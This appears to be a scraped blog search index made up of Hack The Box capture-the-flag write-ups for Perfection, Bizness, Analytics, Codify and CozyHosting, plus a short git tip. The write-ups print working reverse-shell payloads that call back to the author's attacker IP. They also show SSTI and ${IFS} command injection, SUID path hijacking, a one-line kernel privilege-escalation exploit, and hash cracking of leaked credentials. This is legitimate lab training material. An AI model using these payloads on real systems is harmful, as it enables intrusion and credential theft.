/usr/bin/echo \"Database service is running.\"fiexit 0We can see that the script executes another script, initdb.sh, with a relative path, using the current directory (.), so we can perform a path hijacking.Path hijackingWe can create a initdb.sh script that sets SUID to the /bin/bash:bash-5.2$ echo \"chmod u+s /bin/bash\" &gt; initdb.shbash-5.2$ chmod +x initdb.sWe execute the /usr/bin/syscheck script:bash-5.2$ sudo /usr/bin/syscheckAnd, now, we can execute /bin/bash with root privileges:bash-5.2$ bash -pFinally, we are root, and we can get our system flag:cat /root/root.txtHeadless has been PwnedEnjoy! ;)" }, { "title": "Hack The Box - Fentastic Moves pwned!", "url": "/posts/htb-fentastic-moves/", "categories": "hack the box, challenge", "tags": "hack the box, challenge, fentastic, moves, fen, chess", "date": "2024-03-24 01:00:01 +0100", "snippet": "Description Garry told me to catch some fish 20 metersSolutionTo solve this challenge, I did a python script that you can see at: deepy_blueFentastic Moves has been PwnedEnjoy! ;)", "content": "Description Garry told me to catch some fish 20 metersSolutionTo solve this challenge, I did a python script that you can see at: deepy_blueFentastic Moves has been PwnedEnjoy! ;)" }, { "title": "Hack the box - Perfection pwned!", "url": "/posts/htb-perfection/", "categories": "hack the box, machine", "tags": "hack the box, perfection, ruby, ssti, password cracking", "date": "2024-03-17 01:00:01 +0100", "snippet": "Perfection infoAnnotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.10.16.108 Target machine (victim, Perfection): 10.10.11.253...", "content": "Perfection infoAnnotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.10.16.108 Target machine (victim, Perfection): 10.10.11.253EnumerationLet’s go look for the open ports in the machine using nmap:nmap -Pn -n -sS -p- --open -T5 --min-rate 5000 -oN nmap_initial.txt 10.10.11.253PORT STATE SERVICE22/tcp open ssh80/tcp open httpFootprintingWe fine tune the scan to see if we can get more information about the running services:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 80e479e85928df952dad574a4604ea70 (ECDSA)|_ 256 e9ea0c1d8613ed95a9d00bc822e4cfe9 (ED25519)80/tcp open http nginx|_http-title: Weighted Grade CalculatorService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe can see that there is a web service running on port 80, so we browse to http://10.10.11.253 and we take a look at the web:HomeAbout usWeighted Grade CalculatorThe web contains a too to calculating student grades based on weighting.If we look at the bottom, we can see that is powered by WEBrick.Powered by WEBrickWEBrick is a ruby library provinding HTTP web servers.If we look at more information on the web with wappalizer, we can see that is using Ruby 3.0.2.Wappalizer infoThis versions does not seems vulnerable, so we have to try another approach.FootholdSSTI (Sever Side Template Injection)As the only place from which we can enter data is the weighted grade calculator, we can try there some Ruby SSTIs.The most convenient way is intercepting the request using burp, send it to the burp repeater and modifying it there.There’s a “bad characters” protection, but we can bypass it using url encoding.Now that we know that there is a SSTI, we can try to inject a reverse shell.The first thing is start a listener on our machine:nc -lvnp 12345Now, we need a reverse shell capable to avoid the “bad characters” protection, so we encoded it on base64:echo \"bash -i &gt;&amp; /dev/tcp/10.10.16.108/12345 0&gt;&amp;1\" | base64YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA4LzEyMzQ1ICAwPiYxCg==Now, we wrap it so that the reverse shell will be executed on the server:echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA4LzEyMzQ1ICAwPiYxCg== | base64 -d | bashWe wrap it so that our payload will be interpreted by ruby taking advantage of the SSTI:&lt;%=system(\"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA4LzEyMzQ1ICAwPiYxCg== | base64 -d | bash\");%&gt;And, finally, we urlencode it:%0A&lt;%25%3dsystem(\"echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA4LzEyMzQ1ICAwPiYxCg==+|+base64+-d+|+bash\");%25&gt;Now that we have our payload ready, we will inject it on the request using burp:Original requestRequest payload Note the “1” before the payloadWe send the request and we got shell!susanFirst thing is upgrading the tty to be able to work comfortably:script /dev/null -c bashctrl+zstty raw -echo; fgreset xtermexport TERM=xterm-256colorstty rows 56 columns 209Now, we can start collecting information about our new user:susan@perfection:~/ruby_app$ whoamisusansusan@perfection:~/ruby_app$ iduid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)susan@perfection:~$ ls -lAdrwxr-xr-x 2 root root 4096 Oct 27 10:36 Migrationdrwxr-xr-x 4 root susan 4096 Oct 27 10:36 ruby_app-rw-r----- 1 root susan 33 Mar 16 19:10 user.txtWe got our user flag:cat user.txtWe still need to escalate privileges, so we keep looking.susan@perfection:~$ ls -R Migration/Migration/:pupilpath_credentials.dbsusan@perfection:~$ ls -R ruby_app/ruby_app/:main.rb public viewsruby_app/public:css fonts imagesruby_app/public/css:font-awesome.min.css lato.css montserrat.css w3.cssruby_app/public/fonts:JTUHjIg1_i6t8kCHKm4532VJOt5-QNFgpCtr6Hw5aX8.ttf S6uyw4BMUTPHjx4wWw.ttfruby_app/public/images:checklist.jpg lightning.png susan.jpg tina.jpgruby_app/views:about.erb index.erb weighted_grade.erb weighted_grade_results.erbWe see an interesting file: pupilpath_credentials.db, so we are going to continue investigating there:susan@perfection:~$ file Migration/pupilpath_credentials.dbMigration/pupilpath_credentials.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 6, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 6A sqlite database called credentials… Let’s see what contains!$ sqlite3 pupilpath_credentials.databasesqlite&gt; .tablesuserssqlite&gt; select * from users;1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec573|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a63934|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8We have some users with their passwords hashes.If we review Susan’s mails, we will find some useful information:$ cat /var/mail/susanDue to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other studentsin our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}Note that all letters of the first name should be convered into lowercase.Please hit me with updates on the migration when you can. I am currently registering our university with the platform.- Tina, your delightful studentsGreat! We have the password format and the hash, so we can crack it using hashcat.We will start with susan, since it’s our current user.echo abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f &gt; hashhashcat -m 1400 hash -a 3 susan_nasus_?d?d?d?d?d?d?d?d?dAfter a while we will have Susan’s password, and we will look if she has sudo capabilities.Privilege escalation$ sudo -l[sudo] password for susan:Matching Defaults entries for susan on perfection: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser susan may run the following commands on perfection: (ALL : ALL) ALLNice! She can run all commands as root without password, so we elevate our privileges:sudo suAnd, finally, we get our system flag:cat /root/root.txtPerfection has been pwnedEnjoy! ;)" }, { "title": "Hack the box - Bizness pwned!", "url": "/posts/htb-bizness/", "categories": "hack the box, machine", "tags": "hack the box, bizness, ofbiz, derby", "date": "2024-03-10 01:00:01 +0100", "snippet": "Machine infoBizness infoAnnotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.10.16.79 Target machine (victim, Bizness): 10.10.1...", "content": "Machine infoBizness infoAnnotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.10.16.79 Target machine (victim, Bizness): 10.10.11.252EnumerationLet’s go look for the open ports in the machine using nmap:sudo nmap -Pn -n -sS -p- --open -T5 --min-rate=5000 -oN nmap_initial.txt 10.10.11.252PORT STATE SERVICE22/tcp open ssh80/tcp open http443/tcp open https38657/tcp open unknown44495/tcp open unknownFootprintingWe fine tune the scan to see if we can get more information about the running services:sudo nmap -Pn -n -sVC -p22,80,443,38657,44495 -oN nmap_versions.txt 10.10.11.252PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)| ssh-hostkey: | 3072 3e21d5dc2e61eb8fa63b242ab71c05d3 (RSA)| 256 3911423f0c250008d72f1b51e0439d85 (ECDSA)|_ 256 b06fa00a9edfb17a497886b23540ec95 (ED25519)80/tcp open http nginx 1.18.0|_http-server-header: nginx/1.18.0|_http-title: Did not follow redirect to https://bizness.htb/443/tcp open ssl/https nginx/1.18.0|_http-server-header: nginx/1.18.0|_http-title: Did not follow redirect to https://bizness.htb/| tls-nextprotoneg: |_ http/1.1|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK| Not valid before: 2023-12-14T20:03:40|_Not valid after: 2328-11-10T20:03:40| tls-alpn: |_ http/1.138657/tcp closed unknown44495/tcp open tcpwrappedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe can see that there is a web service running on port 80 pointing to https://bizness.htb/, so let’s start there.First of all, we add the machine address to our /etc/hosts:echo \"https://bizness.htb/\" | sudo tee -a /etc/hostsWe browse to https://bizness.htb/ to investigate the web:Bizness incorporated webWe can’t do anything in the web, so we will fuzzing with gobuster to find hidden resources:gobuster dir -u https://bizness.htb -x php,txt,html -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -k -b 301,302,403,404 | tee gobuster.txtAnd, we find the following resources:/index.html (Status: 200) [Size: 27200]/control (Status: 200) [Size: 34633]Under /control we have /control/login, so we browse to https://bizness.htb/control/login and we find the following form:Bizness loginWe can see the OFBiz logo. OFBiz framework is an Apache open source ERP (Enterprise resource planning) system.If we look at the very bottom of the page, we can see the OFBiz version:Bizness versionIt’s running the 18.12 version.The current version it’s a 18.12.12, so could be a little outdated.If we look for vulnerabilities for the OFBiz 18.12 version, we can see that there is the CVE-2023-49070 that allows an authentication bypass in versions &lt;= 18.12.10:OFBIz CVE-2023-49070 in githubSeems very convenient for us, so we download a PoC and we try our luck.Foothold I used This PoC from @kjakaba (thanks for the work! ;)). To be able to execute the @kjakaba’s exploit, we need the ysoserial-all.jar package.We open a netcat listening on our side:nc -lvnp 12345And now, we run the exploit:python3 ofbiz_exploit.py --url https://bizness.htb --cmd 'nc -e /bin/bash 10.10.16.79 12345' Seems that the PoCs that I tried don’t work every time, and we may have to run it a few times, so be patient :PAnd… We get shell!ofbizFist of all, as always, it’s upgrading our tty:script /dev/null -c bashctrl+zstty raw -echo;fgreset xtermexport TERM=xterm-256colorstty rows 56 columns 209Now, we can get our user flag:cat /home/ofbiz/user.txtSeems that we can’t do anything else with our new user.As OFBiz by default uses the embedded database derby let’s take a look at its files, in the opt/ofbiz/runtime/data/derby/ofbiz/ path.In /opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.data we have the crentials of the admin user:cat c54d0.dat| grep -i password &lt;eeval-UserLogin createdStamp=\"2023-12-16 03:40:23.643\" createdTxStamp=\"2023-12-16 03:40:23.445\" currentPassword=\"$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I\" enabled=\"Y\" hasLoggedOut=\"N\" lastUpdatedStamp=\"2023-12-16 03:44:54.272\" lastUpdatedTxStamp=\"2023-12-16 03:44:54.213\" requirePasswordChange=\"N\" userLoginId=\"admin\"/&gt;$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I is a SHA-1 hash with a salt. The salt is the character d, and the hashed value is uP0_QaVBpDWFeo8-dRzDqRwXQ2I, besides uP0_QaVBpDWFeo8-dRzDqRwXQ2I is encoded in base64.To crack this password, we need to decode uP0_QaVBpDWFeo8-dRzDqRwXQ2I from base64url to hex:echo \"uP0_QaVBpDWFeo8-dRzDqRwXQ2I\" | tr '_-' '/+' | base64 -d 2&gt;/dev/null | xxd -psb8fd3f41a541a435857a8f3e751cc3a91c174362Now, we add the salt and store the string in the hash.txt file:echo -n \"b8fd3f41a541a435857a8f3e751cc3a91c174362:d\" &gt; hash.txtAnd, now, we use hashcat to crack it:hashcat -a 0 -m 120 hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txtAfter a while, we will have the password for the admin user.So, we will try if it is reused for the root user:suIt works!And we can get our system flag:cat /root/root.txtBizness has been PwnedEnjoy! ;)" }, { "title": "Hack the box - Analytics pwned!", "url": "/posts/htb-analytics/", "categories": "hack the box, machine", "tags": "hack the box, analytics, docker, metabase, CVE-2023-32629", "date": "2024-03-02 01:00:01 +0100", "snippet": "Machine infoAnalytics infoAnnotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.10.16.101 Target machine (victim, Devvortex): 10...", "content": "Machine infoAnalytics infoAnnotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.10.16.101 Target machine (victim, Devvortex): 10.10.11.233EnumerationIf we list the open ports in the machine, we can see that there are two open ports: 22 (ssh) and 80 (http):nmap -Pn -n -sS -p- -T5 --min-rate 5000 -oN nmap_initial.txt 10.10.11.23322/tcp open ssh80/tcp open httpFootprintingIf we look for more information about the services running in those ports we will find the machine address:nmap -Pn -n -sVC -p22,80 10.10.11.233PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)|_ 256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://analytical.htb/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe add the machine address to our /etc/hosts:echo \"10.10.11.233 analytical.htb\" | sudo tee -a /etc/hostsNow, we browse to the web to take a look:Analytics webIf we go to the login page it will not work:Analytics web login errorThe login page it’s under the domain data.analytical.htb, so let’s add it to our /etc/hosts:echo \"10.10.11.233 data.analytical.htb\" | sudo tee -a /etc/hostsAnd, let’s reload the login pageAnalytics web login pageFootholdDocker containerWe can see that is using metabase, so let’s look for vulnerabilities:searchsploit metabaseMetabase 0.46.6 - Pre-Auth Remote Code Execution | linux/webapps/51797.pyOk, we got one.It’s a RCE (Remote Code Execution), so we will start listening on our side to try to get a remote shell:nc -lvnp 1234And, now we copy the script to our working directory and we run it:cp /opt/exploitdb/exploits/linux/webapps/51797.py metabase_exploit.pysudo python3 metabase_exploit.py --lhost 10.10.16.101 --lport 1234 --sport 80 --url http://data.analytical.htbWe got shell, but inside a docker container.If we print the environment variables, we will find some credentials:SHELL=/bin/shMB_DB_PASS=HOSTNAME=16a5278f5551LANGUAGE=en_US:enMB_JETTY_HOST=0.0.0.0JAVA_HOME=/opt/java/openjdkMB_DB_FILE=//metabase.db/metabase.dbPWD=/LOGNAME=metabaseMB_EMAIL_SMTP_USERNAME=HOME=/home/metabaseLANG=en_US.UTF-8META_USER=metalyticsMETA_PASS=fakepasswordMB_EMAIL_SMTP_PASSWORD=USER=metabaseSHLVL=2MB_DB_USER=FC_LANG=en-USLD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../libLC_CTYPE=en_US.UTF-8MB_LDAP_BIND_DN=LC_ALL=en_US.UTF-8MB_LDAP_PASSWORD=PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binMB_DB_CONNECTION_URI=JAVA_VERSION=jdk-11.0.19+7_=/bin/printenvmetalyticsWith our new credentials, we will login through ssh:ssh metalytics@10.10.11.233First, we get our user flag:cat user.txtAnd, now, we see that with our new user we will not be able to escalate privileges…metalytics@analytics:~$ iduid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)metalytics@analytics:~$ sudo -l[sudo] password for metalytics:Sorry, user metalytics may not run sudo on localhost.If we look the system version we can see that is a vulnerable Ubuntu version.metalytics@analytics:~$ uname -aLinux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/linuxThe vulnerability is CVE-2023-32629, so we will exploit it to gain root privileges:unshare -rm sh -c \"mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;\" &amp;&amp; u/python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'Now that we are root, we can get our system flag:cat /root/root.txtPwned!Analytics has been PwnedEnjoy! ;)" }, { "title": "Excluding local files in git without creating a .gitignore", "url": "/posts/git-excluding-files/", "categories": "git, configuration", "tags": "git, configuration", "date": "2024-03-01 01:00:01 +0100", "snippet": "Let’s suppose that you have cloned a git third-party repository and, locally, inside the repository, you have new (and untracked) files.These files could be files created by you, by text editors, e...", "content": "Let’s suppose that you have cloned a git third-party repository and, locally, inside the repository, you have new (and untracked) files.These files could be files created by you, by text editors, etc.Does not matter.These are the kind of files that you don’t want to share with others.Or, simply, you don’t have permissions to share these files and it’s quite annoying for you stash them (or delete them) every time you pull the last version.For example, you have cloned the github seclists repository and you want to have the rockyou.txt file umcompressed in its path.You will not share it with others, you don’t have permissions to upload it to the repository. Even if you had permissions to upload it to the repository, it will not make sense, since its compressed version it’s already uploaded.So, you want to ignore your local rockyou.txt file.Besides, you want exclude these files without create a .gitignore file.Why?Because it’s not a change you will share with others, because you don’t want to see these changes on your shell prompt or because any other reason.You can create rules that are not committted with the repository adding them to the .git/info/exclude file inside the repository in the same way you would add it to .gitignore.For example, if you had the github seclists repository cloned into /opt, you had to edit your /opt/SecLists/.git/info/exclude file (create it if it doesn’t exists) and add:rockyou.txtThat easy. Now your new local (and untracked) files will no longer be a nuisance.Enjoy! ;)" }, { "title": "Hack the box - Codify pwned!", "url": "/posts/htb-codify/", "categories": "hack the box, machine", "tags": "hack the box, codify, vm2 library, sqlite3, posix variable quotes", "date": "2024-02-24 01:00:01 +0100", "snippet": "Machine infoCodify infoAnnotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.10.16.96 Target machine (victim, Codify): 10.10.11....", "content": "Machine infoCodify infoAnnotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.10.16.96 Target machine (victim, Codify): 10.10.11.239EnumerationIf we list the open ports in the machine, we can see that there are two open ports: 22 (ssh) and 80 (http):nmap -Pn -n -sS -p- -T5 --min-rate 5000 -oN nmap_initial.txt 10.10.11.23922/tcp open ssh80/tcp open httpFootprintingIf we look for more information about the services running in those ports we will find the machine address:map -Pn -n -sVC -p22,80 10.10.11.239PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 96071cc6773e07a0cc6f2419744d570b (ECDSA)|_ 256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)80/tcp open http Apache httpd 2.4.52|_http-server-header: Apache/2.4.52 (Ubuntu)|_http-title: Did not follow redirect to http://codify.htb/Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelWe add the machine address to our /etc/hosts:echo \"10.10.11.239 codify.htb\" | sudo tee -a /etc/hostsCodify webWe browse to http://codify.htb to take a look at the web:CodifyCodifyAbout usCodify about usHere, we can see that the editor is using the vm2 library.LimitationsCodify limitationsEditorCodify editorFootholdAs the editor is using the vm2 library, and this project is discontinued due security issues, we let’s take advantage of a sandbox escape PoC in vm2 to inject a reverse shell in the editor.We start a listener in our host:nc -lvnp 1234And, we inject the reverse shell in the editor:Codify editor reverse shellsvcNow, we get shell as the user svc.svc@codify:~$ whoamisvcsvc@codify:~$ iduid=1001(svc) gid=1001(svc) groups=1001(svc)After taking a look at the system files, in /var/www/contact we can find the sqlite3 database tickets.db.Inside the database we will find the hashed password for the user joshua:sqlite3 tickets.dbsqlite&gt; .tablestickets userssqlite&gt; select * from users;3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2We analyze the hash to see what type it is:hashid $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2Analyzing 'a/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'[+] Cisco Type ba4c0cfe23b95aef6f5df7d0c88d6ceWe put the hash in the hash.txtfile:echo \"$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2\" &gt; hash.txtAnd, we crack the hash using hashcat:hashcat -a 0 -m 3200 hash.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txtjoshuaNow, we have a new user and password, and since seems useless on the web, we will try to connect by ssh:ssh joshua@10.10.11.239And we are in!joshua@codify:~$ iduid=1000(joshua) gid=1000(joshua) groups=1000(joshua)We can get our user flag:joshua@codify:~$ cat user.txtAfter taking our flag, we need to escalate privileges, so let’s take a look to see what we can do as joshua:joshua@codify:~$ sudo -l[sudo] password for joshua:Matching Defaults entries for joshua on codify: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser joshua may run the following commands on codify: (root) /opt/scripts/mysql-backup.shWe can execute the /opt/scripts/mysql-backup.sh script as root, so let’s take a look at the source code:joshua@codify:~$ cat /opt/scripts/mysql-backup.sh#!/bin/bashDB_USER=\"root\"DB_PASS=$(/usr/bin/cat /root/.creds)BACKUP_DIR=\"/var/backups/mysql\"read -s -p \"Enter MySQL password for $DB_USER: \" USER_PASS/usr/bin/echoif [[ $DB_PASS == $USER_PASS ]]; then /usr/bin/echo \"Password confirmed!\"else /usr/bin/echo \"Password confirmation failed!\" exit 1fi/usr/bin/mkdir -p \"$BACKUP_DIR\"databases=$(/usr/bin/mysql -u \"$DB_USER\" -h 0.0.0.0 -P 3306 -p\"$DB_PASS\" -e \"SHOW DATABASES;\" | /usr/bin/grep -Ev \"(Database|information_schema|performance_schema)\")for db in $databases; do /usr/bin/echo \"Backing up database: $db\" /usr/bin/mysqldump --force -u \"$DB_USER\" -h 0.0.0.0 -P 3306 -p\"$DB_PASS\" \"$db\" | /usr/bin/gzip &gt; \"$BACKUP_DIR/$db.sql.gz\"done/usr/bin/echo \"All databases backed up successfully!\"/usr/bin/echo \"Changing the permissions\"/usr/bin/chown root:sys-adm \"$BACKUP_DIR\"/usr/bin/chmod 774 -R \"$BACKUP_DIR\"/usr/bin/echo 'Done!'Ok, we can see that the programmer forgot to quote the variables in the passwords comparision:if [[ $DB_PASS == $USER_PASS ]]So, we can exploit this in order to get the root password.If you want to know more about the implications of forgetting to quote a variable in bash comparisons you can take a look at this GREAT post in stackexchange:security implications of forgetting to quote a variable in bash posix shellsTo bruteforce the root password I did a python script that you can see here: bruceforcer.pyAfter a while we will have our root password and we can get the system flag:suroot@codify:~# cat /root/root.txtPwned!Codify has been PwnedEnjoy! ;)" }, { "title": "Hack the box - CozyHosting pwned!", "url": "/posts/htb-cozyhosting/", "categories": "hack the box, machine", "tags": "hack the box, cozyhosting, spring boot, postgres, sudo proxycommand", "date": "2024-02-17 01:00:01 +0100", "snippet": "Machine infoCozyHosting infoAnnotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.10.16.96 Target machine (victim, CozyHosting):...", "content": "Machine infoCozyHosting infoAnnotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.10.16.96 Target machine (victim, CozyHosting): 10.10.11.230EnumerationLet’s go look for the open ports in the machine using nmap:sudo nmap -Pn -n -sS -p- -T5 --min-rate 5000 -oN nmap_initial.txt 10.10.11.230PORT STATE SERVICE22/tcp open ssh80/tcp open http4646/tcp open dots-signal4848/tcp open appserv-http8083/tcp open us-srvFootprintingWe fine tune the scan to see if we can get more information about the running services:sudo nmap -Pn -n -sVC -p22,80,4646,4848,8083 -oN nmap_initial_versions.txt 10.10.11.230PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)|_ 256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://cozyhosting.htb4646/tcp open dots-signal?4848/tcp open appserv-http?8083/tcp open us-srv?Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe can see that there is a web service running on port 80 pointing to http://cozyhosting.htb, so let’s start there.First of all, we add the machine address to our /etc/hosts:echo \"http://cozyhosting.htb\" | sudo tee -a /etc/hostsWe browse to http://cozyhosting.htb to investigate the web:CozyHosting webUsing wappalyzer we can see that is programmed in java:CozyHosting web wappalyzerWe can’t do anything in the web, so we will fuzzing with gobuster to find hidden resources:gobuster dir -u http://cozyhosting.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 403,404,301[+] Url: http://cozyhosting.htb[+] Method: GET[+] Threads: 10[+] Wordlist: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 403,404,301[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/index (Status: 200) [Size: 12706]/login (Status: 200) [Size: 4431]/admin (Status: 401) [Size: 97]/logout (Status: 204) [Size: 0]/error (Status: 500) [Size: 73]/admin is very interesting, but, if we look at /error, we can see that the “white label error” is a spring boot error:CozyHosting white label errorSo let’s fuzz with a spring boot dictionary:gobuster dir -u http://cozyhosting.htb -w /opt/SecLists/Discovery/Web-Content/spring-boot.txt[+] Url: http://cozyhosting.htb[+] Method: GET[+] Threads: 10[+] Wordlist: /opt/SecLists/Discovery/Web-Content/spring-boot.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/actuator (Status: 200) [Size: 634]/actuator/env/lang (Status: 200) [Size: 487]/actuator/env (Status: 200) [Size: 4957]/actuator/env/home (Status: 200) [Size: 487]/actuator/beans (Status: 200) [Size: 127224]/actuator/env/path (Status: 200) [Size: 487]/actuator/health (Status: 200) [Size: 15]/actuator/mappings (Status: 200) [Size: 9938]/actuator/sessions (Status: 200) [Size: 48]FootholdkandersonIf we look in /actuator/sessions we can find the cookie for the user kanderson:CozyHosting web actuator sessionsAs kanderson is the only user that we have, let’s try if it has admin privileges in the web.We put our burp suite intercepting in proxy mode, and we edit the cookie values for the petitions to impersonate kanderson:Impersonating kanderson with burp suiteOk, now as kanderson we can connect to a host using ssh intruducing the host and the username.Unafortunately we don’t have any, so we will get an error:Cozyhosting admin panel ssh errorIf we look closely the error we can see that it’s a bash error, so the error could be generated directly on the machine and not in the web:Cozyhosting admin panel ssh error detailWe take a closer look at the petition to the request made using burp suite and we can see that /bin/bash it’s being called:Cozyhosting admin panel ssh error in burpReverse shellAs it seems that the parameters are sent without sanitization to the system, we will try to inject here a reverse bash shell using burp suite.We start listening in our machine:nc -lvnp 1234Now, we generate our shell.As the only input sanitization is that the username can’t contain spaces, we will encode it in base64.echo \"bash -i &gt;&amp; /dev/tcp/10.10.16.96/1234 0&gt;&amp;1\" | base64 -w 0YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEKAs we need to our shell will be executed asecho YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEK|base64 -d|bash in the target, and we can’t use whitespaces, we will take advantage of Input Field Separators (IFS).We are going to replace the whitespaces with ${IFS}:echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEK|base64${IFS}-d|bashOur payload for the username parameter will be:user;echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Ni8xMjM0IDA+JjEK|base64${IFS}-d|bashAs our payload contains special characters, we will url-encode it using burp suite: Select text -&gt; right click -&gt; Convert selection -&gt; URL -&gt; URL-encode key characters (CTRL+U):Cozyhosting admin panel ssh payloadWe send it and… We have our shell!appFist of all, as always, it’s upgrading our tty:script /dev/null -c bashctrl+zstty raw -echo;fgreset xtermexport TERM=xterm-256colorstty rows 56 columns 209We take a look at a new user:app@cozyhosting:/app$ iduid=1001(app) gid=1001(app) groups=1001(app)We look at what files the app user has:app@cozyhosting:/app$ ls -lAcloudhosting-0.0.1.jarAnd we look for other uses in the system:app@cozyhosting:/app$ ls -lA /homedrwxr-x--- 3 josh josh 4096 Aug 8 2023 joshWe download the file, as we don’t have permissions to run netcat we will start a python web server:app@cozyhosting:/app$ python3 -m http.server 12345And we download the file in our host using wget:wget 10.10.11.230:12345/cloudhosting-0.0.1.jarWe extract the cloudhosting-0.0.1.jar file in our host and we take a look at the files content.After a while, we will find interesting information in BOOT-INF/classes/application.properties:server.address=127.0.0.1server.servlet.session.timeout=5mmanagement.endpoints.web.exposure.include=health,beans,env,sessions,mappingsmanagement.endpoint.sessions.enabled = 